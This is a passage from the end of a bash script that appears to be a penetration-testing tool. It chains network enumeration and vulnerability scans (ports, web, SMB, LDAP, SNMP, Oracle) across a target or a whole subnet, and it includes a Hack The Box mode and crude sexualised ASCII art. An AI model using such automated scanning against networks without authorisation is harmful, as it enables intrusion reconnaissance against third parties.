        find $cwd/ -maxdepth 1 -name "aquaurls.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "dns_aquatone" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSCREENSHOTS" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSSLSCREENSHOTS" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "eyewitness-report-$rhost-*" -exec mv {} $cwd/$rhost-report/ \;
    fi

}

show_Version() {
    cat <<"EOF"
@@@  @@@  @@@@@@@@  @@@@@@@    @@@@@@   @@@   @@@@@@   @@@  @@@  
@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@@@@@@  @@@@ @@@  
@@!  @@@  @@!       @@!  @@@  !@@       @@!  @@!  @@@  @@!@!@@@  
!@!  @!@  !@!       !@!  @!@  !@!       !@!  !@!  @!@  !@!!@!@!  
@!@  !@!  @!!!:!    @!@!!@!   !!@@!!    !!@  @!@  !@!  @!@ !!@!  
!@!  !!!  !!!!!:    !!@!@!     !!@!!!   !!!  !@!  !!!  !@!  !!!  
:!:  !!:  !!:       !!: :!!        !:!  !!:  !!:  !!!  !!:  !!!  
 ::!!:!   :!:       :!:  !:!      !:!   :!:  :!:  !:!  :!:  !:!  
  ::::     :: ::::  ::   :::  :::: ::    ::  ::::: ::   ::   ::  
   :      : :: ::    :   : :  :: : :    :     : :  :   ::    :   
                                                                 
                                              
     @@@         @@@@@@@@      @@@  @@@  @@@  
    @@@@        @@@@@@@@@@     @@@  @@@  @@@  
   @@!@!        @@!   @@@@     @@!  @@!  @@!  
  !@!!@!        !@!  @!@!@     !@   !@   !@   
 @!! @!!        @!@ @! !@!     @!@  @!@  @!@  
!!!  !@!        !@!!!  !!!     !!!  !!!  !!!  
:!!:!:!!:       !!:!   !!!                    
!:::!!:::  :!:  :!:    !:!     :!:  :!:  :!:  
     :::   :::  ::::::: ::      ::   ::   ::  
     :::   :::   : : :  :      :::  :::  :::  

EOF
}

Remaining_Hosts_All_Scans() {
    echo -e "$rhost is the current RHOST!"
    grep -v $rhost live-hosts-ip.txt >remaining-hosts-to-scan.txt
    ip addr | grep -w inet | grep -v 127 | awk {'print $2'} | cut -d "/" -f 1 >myips.txt
    myipsFile=myips.txt
    gmyips=$(cat "$myipsFile")
    grep -v "$gmyips" remaining-hosts-to-scan.txt >remaininghosts.txt
    remainingHostsFileName=remaininghosts.txt
    hostsRemainingList=$(cat $remainingHostsFileName)
    baseip2=$(echo $rhost | cut -d "." -f1-3)
    cidr_range1=$(echo $baseip2".1")
    cidr_range2=$(echo $baseip2".2")
    cidr_range3=$(echo $baseip2".254")
    for target in $hostsRemainingList; do
        if [[ $target == "$cidr_range1" ]] || [[ $target == "$cidr_range2" ]] || [[ $target == "$cidr_range3" ]]; then
            :
        else
            unset rhost
            set -- "$target" "${@:3}"
            rhost=$target
            Open_Ports_Scan
            Web_Vulns
            Web_Proxy_Scan
            Enum_Web
            unset rhost
            set -- "$target" "${@:3}"
            rhost=$target
            Enum_Web_SSL
            unset rhost
            set -- "$target" "${@:3}"
            rhost=$target
            ftp_scan
            nfs_enum
            screenshotWEB
            screenshotWEBSSL
            Intense_Nmap_UDP_Scan
            Enum_SMB
            ldap_enum
            cups_enum
            java_rmi_scan
            FULL_TCP_GOOD_MEASUERE_VULN_SCAN
            Enum_SNMP
            vulnscan
            Enum_Oracle
            Clean_Up
        fi

    done
    rm myips.txt
    rm remaining-hosts-to-scan.txt
    rm remaininghosts.txt
}

sexy_chick() {
    cat <<"EOF"
                          8888  8888888
                   888888888888888888888888
                8888:::8888888888888888888888888
              8888::::::8888888888888888888888888888
             88::::::::888:::8888888888888888888888888
           88888888::::8:::::::::::88888888888888888888
         888 8::888888::::::::::::::::::88888888888   888
            88::::88888888::::m::::::::::88888888888    8
          888888888888888888:M:::::::::::8888888888888
         88888888888888888888::::::::::::M88888888888888
         8888888888888888888888:::::::::M8888888888888888
          8888888888888888888888:::::::M888888888888888888
         8888888888888888::88888::::::M88888888888888888888
       88888888888888888:::88888:::::M888888888888888   8888
      88888888888888888:::88888::::M::;o*M*o;888888888    88
     88888888888888888:::8888:::::M:::::::::::88888888    8
    88888888888888888::::88::::::M:;:::::::::::888888888
   8888888888888888888:::8::::::M::aAa::::::::M8888888888       8
   88   8888888888::88::::8::::M:::::::::::::888888888888888 8888
  88  88888888888:::8:::::::::M::::::::::;::88:88888888888888888
  8  8888888888888:::::::::::M::"@@@@@@@"::::8w8888888888888888
   88888888888:888::::::::::M:::::"@a@":::::M8i888888888888888
  8888888888::::88:::::::::M88:::::::::::::M88z88888888888888888
 8888888888:::::8:::::::::M88888:::::::::MM888!888888888888888888
 888888888:::::8:::::::::M8888888MAmmmAMVMM888*88888888   88888888
 888888 M:::::::::::::::M888888888:::::::MM88888888888888   8888888
 8888   M::::::::::::::M88888888888::::::MM888888888888888    88888
  888   M:::::::::::::M8888888888888M:::::mM888888888888888    8888
   888  M::::::::::::M8888:888888888888::::m::Mm88888 888888   8888
    88  M::::::::::::8888:88888888888888888::::::Mm8   88888   888
    88  M::::::::::8888M::88888::888888888888:::::::Mm88888    88
    8   MM::::::::8888M:::8888:::::888888888888::::::::Mm8     4
        8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm    2
       88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M
      8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M
     88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M
    88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:
    8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M
      88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M
     888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M
     888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8
     88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@
     8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@
      888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8
      888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M
       88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM
        88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM
         88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM
          88   8MM::::::::::::::::::::::::::::::::::MMMMMM
           8   88MM::::::::::::::::::::::M:::M::::::::MM
EOF
    echo ""
}

# Pre-process options to:
# - expand -xyz into -x -y -z
# - expand --longopt=argument into --longopt argument
ARGV=()
END_OF_OPT=
while [[ $# -gt 0 ]]; do
    argument="$1"
    shift
    case "${END_OF_OPT}${argument}" in
    --)
        ARGV+=("$argument")
        END_OF_OPT=1
        ;;
    --*=*) ARGV+=("${argument%%=*}" "${argument#*=}") ;;
    --*)
        ARGV+=("$argument")
        END_OF_OPT=1
        ;;
    -*) for i in $(seq 2 ${#argument}); do ARGV+=("-${argument:i-1:1}"); done ;;
    *) ARGV+=("$argument") ;;
    esac
done

# Apply pre-processed options
set -- "${ARGV[@]}"

# Parse options
END_OF_OPT=
POSITIONAL=()
while [[ $# -gt 0 ]]; do
    case "${END_OF_OPT}${1}" in
    -h | --help)
        helpFunction 0
        ;;
    -t | --target)
        shift
        rhost="$1"
        validate_IP
        banner1 0
        getUpHosts 0
        Open_Ports_Scan 0
        Web_Vulns 0
        Web_Proxy_Scan 0
        Enum_Web 0
        Enum_Web_SSL 0
        screenshotWEB 0
        screenshotWEBSSL 0
        ftp_scan 0
        nfs_enum 0
        Intense_Nmap_UDP_Scan 0
        Enum_SMB 0
        ldap_enum 0
        cups_enum 0
        java_rmi_scan 0
        FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
        Enum_SNMP 0
        vulnscan 0
        Enum_Oracle 0
        Clean_Up 0
        sexy_chick 0
        ;;
    -f | --file)
        shift
        filearg=$1
        if [[ -f $filearg ]]; then
            targets=$(cat $filearg)
            for target in $targets; do
                unset rhost
                set -- "$target" "${@:3}"
                rhost=$target
                validate_IP
                banner1 0
                Open_Ports_Scan 0
                Web_Vulns 0
                Web_Proxy_Scan 0
                Enum_Web 0
                unset rhost
                set -- "$target" "${@:3}"
                rhost=$target
                Enum_Web_SSL
                unset rhost
                set -- "$target" "${@:3}"
                rhost=$target
                screenshotWEB 0
                screenshotWEBSSL 0
                ftp_scan 0
                nfs_enum 0
                Intense_Nmap_UDP_Scan 0
                Enum_SMB 0
                cups_enum 0
                java_rmi_scan 0
                FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
                Enum_SNMP 0
                vulnscan 0
                Enum_Oracle 0
                Clean_Up 0
            done
        else
            echo -e "${NOTDOPE} File must be 1 IP Address per line."
        fi
        sexy_chick 0
        ;;
    -a | --all)
        shift
        rhost="$1"
        validate_IP
        banner1 0
        getUpHosts 0
        Open_Ports_Scan 0
        Web_Vulns 0
        Web_Proxy_Scan 0
        Enum_Web 0
        Enum_Web_SSL 0
        screenshotWEB 0
        screenshotWEBSSL 0
        ftp_scan 0
        nfs_enum 0
        Intense_Nmap_UDP_Scan 0
        Enum_SMB 0
        ldap_enum 0
        cups_enum 0
        java_rmi_scan 0
        FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
        Enum_SNMP 0
        vulnscan 0
        Enum_Oracle 0
        Clean_Up 0
        Remaining_Hosts_All_Scans 0
        sexy_chick 0
        ;;
    -H | --HTB)
        shift
        rhost="$1"
        validate_IP
        banner1 0
        Open_Ports_Scan 0
        Web_Vulns 0
        Web_Proxy_Scan 0
        Enum_Web 0
        Enum_Web_SSL 0
        screenshotWEB 0
        screenshotWEBSSL 0
        ftp_scan 0
        nfs_enum 0
        Intense_Nmap_UDP_Scan 0
        Enum_SMB 0
        ldap_enum 0
        cups_enum 0
        java_rmi_scan 0
        FULL_TCP_GOOD_MEASUERE_VULN_SCAN 0
        dnsCheckHTB 0
        Enum_SNMP 0
        vulnscan 0
        Enum_Oracle 0
        Clean_Up 0
        sexy_chick 0
        ;;
    -v | --version)
        shift
        show_Version 0
        ;;
    -*)
        exitFunction "$@"
        shift 1
        ;;
    *)
        exitFunction "$@"
        shift 1
        ;;
    esac
    shift
done

set -- "${POSITIONAL[@]}"

if [[ "$#" -gt 2 ]]; then
    exitFunction
fi

traperr() {
    echo -e "${NOTDOPE} ERROR: ${BASH_SOURCE[1]} at about ${BASH_LINENO[0]}"
}

set -o errtrace
trap traperr ERR
